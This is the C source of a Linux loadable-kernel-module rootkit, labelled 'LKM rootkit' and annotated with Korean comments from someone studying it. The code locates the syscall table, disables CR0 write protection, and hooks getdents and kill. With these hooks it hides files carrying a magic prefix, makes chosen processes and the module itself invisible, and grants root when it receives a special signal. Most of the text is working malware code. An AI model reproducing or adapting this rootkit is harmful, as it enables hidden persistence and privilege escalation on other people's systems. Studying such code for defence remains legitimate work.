#include "edukit.h"

unsigned long cr0;
static unsigned long *sys_call_table;
typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
typedef asmlinkage int (*orig_kill_t)(pid_t, int);
orig_getdents_t orig_getdents;
orig_kill_t orig_kill;

// 이 함수가 실행되는 것은 오직 한 번 뿐이다.
// 따라서 이후에는 메모리에 상주하고 있지 않아도 된다.
// 이를 커널에게 알려주기 위해 __init 키워드를 사용한다.
static int __init edukit_init(void)
{
	sys_call_table = get_syscall_table_bf();
	if (!sys_call_table)
		return -1;

	// CR0 CPUs register는 커널을 보호하는 것과 연관이 있는 듯 하다.
	cr0 = read_cr0();

	module_hide();
	tidy();

	orig_getdents = (orig_getdents_t)sys_call_table[__NR_getdents];
	orig_kill     =     (orig_kill_t)sys_call_table[__NR_kill];

	unprotect_memory();
	sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
	sys_call_table[__NR_kill]     = (unsigned long)hacked_kill;
	protect_memory();

	return 0;
}

static void __exit edukit_cleanup(void)
{
	unprotect_memory();
	sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
	sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	protect_memory();
}

module_init(edukit_init);
module_exit(edukit_cleanup);

unsigned long *get_syscall_table_bf(void)
{
	unsigned long *syscall_table;
	unsigned long int i;

	for (i = START_MEM; i < END_MEM; i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		// sys_close() 함수의 주소값을 unsigned long으로 자료형 변환을 하고 있다. (이래도 되나?)
		// __NR_close 매크로 변수는 include/unistd.h 에 정의되어 있는 것 같다. [리눅스 커널 디자인의 기술] p.104
		// 근데 사실 long과 int 자료형이 제공하는 크기(4 바이트)는 같은데 구분하는 이유가 뭘까?
		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
}

struct task_struct *find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

int
is_invisible(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

/* 이상 분석하기 */

asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count)
{
	// getdents() 함수는 읽어들인 바이트 수를 반환한다.
	int ret = orig_getdents(fd, dirent, count);
	int err;

	// offset을 의미
	unsigned long off = 0;

	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	// kdirent(aka kernel directory entry)
	// kzalloc(aka kernel zeroed malloc)
	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	// 시스템콜 안에서는 사용자 영역에서 가져온 directory entry를
	// 직접적으로 사용하지 않고 커널 Heap 영역에 복사해서 사용한다.
	// copy_from_user() 함수는 복사하지 못한 바이트 수를 반환한다.
	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

	// 목표 시스템의 커널 버전이 3.19 이하이므로 다음 방식으로 d_inode를 접근한다.
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	// 매개변수로 전달받은 파일 디스크립터로 추적해내려간 데이터의 바이트 수 만큼 ret 변수는 감소한다.
	// ret 변수의 값이 off 변수보다 크지 않으면 파일 디스크립터 이하 모든 inode를 탐색한 것이다.
	while (off < ret)
	{
		// void 포인터로 포인터 연산을 하는 것은 잘못되었다고 배웠는데,
		// 1 바이트씩 증감한다는 것 같다.
		dir = (void *)kdirent + off;

		if ((!proc && (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)) // 프로세스가 아닐 때 && 숨기려는 파일일 때
		 || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))			  // 프로세스일 때      && 숨기려는 프로세스일 때
		{
			if (dir == kdirent)
			{
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		}
		else
		{
			prev = dir;
		}

		off += dir->d_reclen;
	}

	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;

	out:
		// 커널 영역에서 동적 할당한 Heap 영역을 해제
		kfree(kdirent);
		return ret;
}

/* 이하 분석하기 */

static inline void tidy(void)
{
//	kfree(THIS_MODULE->notes_attrs);
//	THIS_MODULE->notes_attrs = NULL;
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
//	kfree(THIS_MODULE->mkobj.mp);
//	THIS_MODULE->mkobj.mp = NULL;
//	THIS_MODULE->modinfo_attrs->attr.name = NULL;
//	kfree(THIS_MODULE->mkobj.drivers_dir);
//	THIS_MODULE->mkobj.drivers_dir = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;

void module_show(void)
{
	list_add(&THIS_MODULE->list, module_previous);
	//kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,
	//			MODULE_NAME);
	module_hidden = 0;
}

void module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	//kobject_del(&THIS_MODULE->mkobj.kobj);
	//list_del(&THIS_MODULE->mkobj.kobj.entry);
	module_hidden = 1;
}

asmlinkage int hacked_kill(pid_t pid, int sig)
{
	struct task_struct *task;

	switch (sig) {
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		// Maybe I don't need this
		case SIGSUPER:
			give_root();
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
			return orig_kill(pid, sig);
	}
	return 0;
}

static inline void
protect_memory(void)
{
	// restore CR0
	write_cr0(cr0);
}

static inline void
unprotect_memory(void)
{
	// CR0[16] is Write Protect Bit
	// CR0[16] is unset to disable Write Protect
	write_cr0(cr0 & ~0x00010000);
}

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("m0nad");
MODULE_DESCRIPTION("LKM rootkit");
